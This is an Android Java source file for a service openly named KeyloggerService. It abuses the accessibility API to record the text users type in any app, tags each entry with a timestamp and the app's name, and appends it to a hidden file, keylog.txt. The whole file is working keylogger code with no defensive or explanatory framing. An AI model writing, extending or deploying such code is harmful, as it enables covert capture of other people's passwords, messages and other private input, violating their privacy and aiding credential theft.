package com.example.keylogger;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class KeyloggerService extends AccessibilityService {

    private static final String TAG = "KeyloggerService";
    private static final String FILE_NAME = "keylog.txt";

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Keylogger Service Connected");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String data = event.getText().toString();
            // event.getText() returns a List<CharSequence>
            if (data != null && !data.isEmpty()) {
                String logMessage = String.format("[%s] %s: %s\n", 
                        getCurrentTimeStamp(), 
                        event.getPackageName(), 
                        data);
                
                Log.d(TAG, logMessage);
                writeToFile(logMessage);
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Keylogger Service Interrupted");
    }

    private void writeToFile(String data) {
        try (FileOutputStream fos = openFileOutput(FILE_NAME, MODE_APPEND)) {
            fos.write(data.getBytes());
        } catch (IOException e) {
            Log.e(TAG, "Error writing to file", e);
        }
    }

    private String getCurrentTimeStamp() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        return sdf.format(new Date());
    }
}
